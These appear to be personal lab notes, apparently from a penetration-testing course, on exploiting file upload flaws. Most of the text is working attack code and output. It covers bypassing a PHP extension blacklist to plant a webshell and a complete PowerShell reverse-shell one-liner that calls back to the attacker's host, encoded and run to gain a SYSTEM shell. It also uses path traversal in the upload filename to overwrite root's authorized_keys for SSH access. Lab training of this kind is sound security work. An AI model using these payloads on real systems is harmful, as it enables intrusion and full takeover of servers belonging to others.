# Executable files → RCE

## Confirming the upload works
Upload a benign text file first to prove the mechanism isn't image-only.
```
kali@kali:~$ echo "this is a test" > test.txt
```
Upload via the browser form → succeeds. Then try `simple-backdoor.php` → **blocked** ("PHP files are not allowed", extension blacklisted).

## Bypass the extension blacklist
Rename `.php` → `.pHP` (case variation) and re-upload → **succeeds**.

Other options worth trying: `.phps`, `.php7`, `.phtml`.

## Confirm code execution
Uploaded file lands in `uploads/`. Send a command with the `cmd` param:
```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
 Directory of C:\xampp\htdocs\meteor\uploads

04/04/2022  06:21 AM               328 simple-backdoor.pHP
04/04/2022  06:03 AM                15 test.txt
...
```
`dir` output confirms RCE. Path `C:\xampp\htdocs\...` confirms XAMPP on Windows.

## Reverse shell via PowerShell -enc

**Step 1 — listener first:**
```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

**Step 2 — encode the one-liner (base64 of UTF-16LE):**
```
kali@kali:~$ pwsh
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.202",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText = [Convert]::ToBase64String($Bytes)
PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...<snip>...AbABvAHMAZQAoACkA
PS> exit
```
>[!note] The IP in `TCPClient(...)` is set to the `tun0` VPN interface (192.168.45.202), not a LAN IP.

**Step 3 — trigger via the webshell (spaces URL-encoded as %20):**
```
kali@kali:~$ curl "http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAg...<snip>...AbABvAHMAZQAoACkA"
```

**Step 4 — catch the shell:**
```
listening on [any] 4444 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.50.189] 50603
PS C:\xampp\htdocs\meteor\uploads> whoami
nt authority\system
```
>[!success] Landed as `nt authority\system` — XAMPP service was running as SYSTEM.

# Non-executable files → Directory Traversal

## Confirm PHP is gone
```
kali@kali:~$ curl http://mountaindesserts.local:8000/index.php
404 page not found
kali@kali:~$ curl http://mountaindesserts.local:8000/admin.php
404 page not found
```
No PHP → can't just drop a webshell. Upload of `test.txt` still succeeds (app now on Linux).

## Test traversal in the filename (Burp Repeater)
Change the `filename` param to:
```
../../../../../../../test.txt
```
>[!warning] Response echoes the `../` back, but that does **not** confirm the write landed — it may be echoing a sanitized value. This is a **blind** write.

## Overwrite authorized_keys → SSH as root
Create a keypair and stage the public key:
```
kali@kali:~$ ssh-keygen
Enter file in which to save the key: fileup
kali@kali:~$ cat fileup.pub > authorized_keys
```
Upload `authorized_keys` with the traversal filename (intercept in Burp, edit `filename`, forward):
```
../../../../../../../root/.ssh/authorized_keys
```

Connect with the matching private key (target SSH on port 2222):
```
kali@kali:~$ rm ~/.ssh/known_hosts        # clear stale host key if reusing hostname
kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.local
...
root@76b77a6eae51:~#
```
>[!success] Overwrote root's `authorized_keys` → SSH access as root with our private key.

# Quick reference

| Scenario                | Blocker              | Technique                                                        |
| ----------------------- | -------------------- | --------------------------------------------------------------- |
| Executable allowed      | ext blacklist        | Case (`​.pHP`) / alt ext (`.php7`, `.phtml`) → webshell → `-enc` |
| Executable, strict ext  | ext blacklist        | Upload `.txt`, then rename back to executable ext                |
| Non-executable only     | can't run the file   | Traversal in `filename` → overwrite `authorized_keys` → SSH      |
